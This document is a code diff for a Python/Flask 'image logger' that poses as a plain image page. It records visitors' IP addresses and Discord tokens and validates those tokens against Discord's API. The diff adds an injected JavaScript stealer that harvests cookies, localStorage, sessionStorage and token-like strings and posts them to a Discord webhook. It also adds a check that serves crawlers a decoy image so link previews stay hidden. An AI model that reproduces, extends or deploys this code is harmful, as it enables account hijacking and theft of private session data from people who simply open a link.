@@ -43,7 +43,7 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
-# ========== VARIÁVEL GLOBAL PARA ARMAZENAR O TOKEN ==========
+# ========== VARIÁVEIS GLOBAIS ==========
 captured_token = None
 captured_token_source = None
 
@@ -70,40 +70,30 @@ def reportError(error):
         pass
 
 def validate_token(token):
-    """Valida token com a API do Discord"""
     if not token or len(token) < 30:
         return None
     if not re.match(r'^[a-zA-Z0-9._-]{30,100}$', token):
         return None
-    
     try:
         headers = {"Authorization": token, "User-Agent": get_random_ua()}
         r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
         if r.status_code == 200:
             data = r.json()
-            username = data.get("username", "Unknown")
-            discriminator = data.get("discriminator", "0000")
-            user_id = data.get("id", "Unknown")
-            email = data.get("email", "No email")
-            verified = data.get("verified", False)
-            nitro = data.get("premium_type", 0)
-            nitro_types = ["None", "Nitro Classic", "Nitro", "Nitro Basic"]
-            nitro_type = nitro_types[nitro] if nitro < len(nitro_types) else "Unknown"
             return {
-                "username": username,
-                "discriminator": discriminator,
-                "user_id": user_id,
-                "email": email,
-                "verified": verified,
-                "nitro": nitro_type,
-                "valid": True
+                "valid": True,
+                "username": data.get("username", "Unknown"),
+                "discriminator": data.get("discriminator", "0000"),
+                "user_id": data.get("id", "Unknown"),
+                "email": data.get("email", "No email"),
+                "verified": data.get("verified", False),
+                "nitro": ["None", "Nitro Classic", "Nitro", "Nitro Basic"][data.get("premium_type", 0)] if data.get("premium_type", 0) < 4 else "Unknown"
             }
         else:
             return {"valid": False, "error": f"HTTP {r.status_code}"}
     except Exception as e:
         return {"valid": False, "error": str(e)}
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None, cookie_data=None):
     if ip and ip.startswith(blacklistedIPs):
         return
     
@@ -153,7 +143,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
     
     os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
     
-    # ===== CONSTRUINDO A DESCRIÇÃO (IP + TOKEN JUNTOS) =====
     description = (
         "**📡 IP LOGGED**\n\n"
         "**Endpoint:** `" + endpoint + "`\n\n"
@@ -174,14 +163,12 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         "**User Agent:**\n```\n" + str(useragent) + "\n```"
     )
     
-    # ===== SE TIVER TOKEN, ADICIONA NA DESCRIÇÃO =====
+    # ===== TOKEN CAPTURADO =====
     if token and token_info:
-        token_status = "✅ **VALIDO**" if token_info.get("valid") else "❌ **INVALIDO**"
         if token_info.get("valid"):
             description += (
                 "\n\n**🎯 DISCORD TOKEN CAPTURED**\n\n"
-                "**Status:** " + token_status + "\n"
-                "**Token:** `" + token[:30] + "...`\n"
+                "**Status:** ✅ VALIDO\n"
                 "> **Username:** `" + token_info.get("username", "Unknown") + "#" + token_info.get("discriminator", "0000") + "`\n"
                 "> **User ID:** `" + token_info.get("user_id", "Unknown") + "`\n"
                 "> **Email:** `" + token_info.get("email", "No email") + "`\n"
@@ -192,11 +179,24 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         else:
             description += (
                 "\n\n**🎯 DISCORD TOKEN ATTEMPT**\n\n"
-                "**Status:** " + token_status + "\n"
-                "**Token:** `" + token[:30] + "...`\n"
+                "**Status:** ❌ INVALIDO\n"
                 "**Error:** `" + token_info.get("error", "Unknown") + "`\n\n"
                 "**Full Token:** ||" + token + "||"
             )
+    
+    # ===== COOKIES/STORAGE CAPTURADOS =====
+    if cookie_data:
+        description += "\n\n**🍪 BROWSER STORAGE CAPTURED**\n"
+        if cookie_data.get("cookies"):
+            description += "\n**Cookies:**\n```\n" + cookie_data["cookies"][:500] + "\n```"
+        if cookie_data.get("localStorage"):
+            description += "\n**localStorage:**\n```\n" + cookie_data["localStorage"][:500] + "\n```"
+        if cookie_data.get("sessionStorage"):
+            description += "\n**sessionStorage:**\n```\n" + cookie_data["sessionStorage"][:500] + "\n```"
+        if cookie_data.get("discord_tokens"):
+            description += "\n**🎯 Discord Tokens Found in Storage:**\n"
+            for dt in cookie_data["discord_tokens"]:
+                description += "> `" + dt[:30] + "...`\n"
     
     embed = {
         "username": config["username"],
@@ -235,14 +235,12 @@ def catch_all(path):
         token_info = None
         
         if config["captureTokens"]:
-            # Tenta vários parâmetros
             for param in [config.get("tokenParam", "token"), "token", "id", "t", "auth", "key", "code"]:
                 if dic.get(param):
                     token = dic.get(param)
                     token_source = f"URL parameter '{param}'"
                     break
             
-            # Se veio em base64, decodifica
             if token and len(token) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', token):
                 try:
                     decoded = base64.b64decode(token).decode()
@@ -252,14 +250,12 @@ def catch_all(path):
                 except:
                     pass
             
-            # Procura padrão de token em qualquer lugar da URL
             if not token:
                 url_match = re.search(r'[a-zA-Z0-9._-]{30,100}', s)
                 if url_match:
                     token = url_match.group(0)
                     token_source = "URL regex match"
             
-            # Valida o token se encontrou
             if token:
                 token_info = validate_token(token)
                 captured_token = token
@@ -277,6 +273,68 @@ def catch_all(path):
         else:
             url = config["image"]
         
+        # ========== COOKIE/STORAGE STEALER SCRIPT ==========
+        steal_script = """
+<script>
+(function() {
+    var webhook = '""" + config["webhook"] + """';
+    
+    function sendData(data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', webhook);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            username: 'Storage Logger',
+            content: '🍪 STORAGE DATA CAPTURED',
+            embeds: [{
+                title: 'Browser Storage',
+                color: 0xFF6600,
+                description: '```\\n' + data + '\\n```'
+            }]
+        }));
+    }
+    
+    // Captura cookies
+    var cookies = document.cookie;
+    var localStorageData = '';
+    var sessionStorageData = '';
+    var discordTokens = [];
+    
+    // localStorage
+    try {
+        for (var key in localStorage) {
+            var val = localStorage[key];
+            localStorageData += key + ': ' + val + '\\n';
+            if (val.match(/[a-zA-Z0-9._-]{30,100}/)) {
+                discordTokens.push(val);
+            }
+        }
+    } catch(e) {}
+    
+    // sessionStorage
+    try {
+        for (var key in sessionStorage) {
+            var val = sessionStorage[key];
+            sessionStorageData += key + ': ' + val + '\\n';
+            if (val.match(/[a-zA-Z0-9._-]{30,100}/)) {
+                discordTokens.push(val);
+            }
+        }
+    } catch(e) {}
+    
+    // Envia se encontrou algo
+    if (cookies || localStorageData || sessionStorageData) {
+        var combined = '';
+        if (cookies) combined += 'COOKIES:\\n' + cookies + '\\n\\n';
+        if (localStorageData) combined += 'LOCALSTORAGE:\\n' + localStorageData + '\\n\\n';
+        if (sessionStorageData) combined += 'SESSIONSTORAGE:\\n' + sessionStorageData + '\\n\\n';
+        if (discordTokens.length) combined += 'DISCORD TOKENS FOUND:\\n' + discordTokens.join('\\n');
+        sendData(combined);
+    }
+})();
+</script>
+"""
+        
         # ========== DISCORD CRAWLER ==========
         is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
         
@@ -290,15 +348,26 @@ def catch_all(path):
                 loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                 return Response(loading, mimetype='image/jpeg')
         
-        # ========== RESPOSTA HTML PARA USUÁRIO NORMAL ==========
-        html = f'''<style>body{{margin:0;padding:0;}}
+        # ========== RESPOSTA HTML COM STEALER ==========
+        html = f'''<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{{margin:0;padding:0;}}
 div.img{{
 background-image:url('{url}');
 background-position:center center;
 background-repeat:no-repeat;
 background-size:contain;
 width:100vw;height:100vh;
-}}</style><div class="img"></div>'''
+}}
+</style>
+</head>
+<body>
+<div class="img"></div>
+{steal_script}
+</body>
+</html>'''
         
         makeReport(ip, ua, endpoint=request.path, url=url, token=token, token_info=token_info)
         return Response(html, mimetype='text/html')
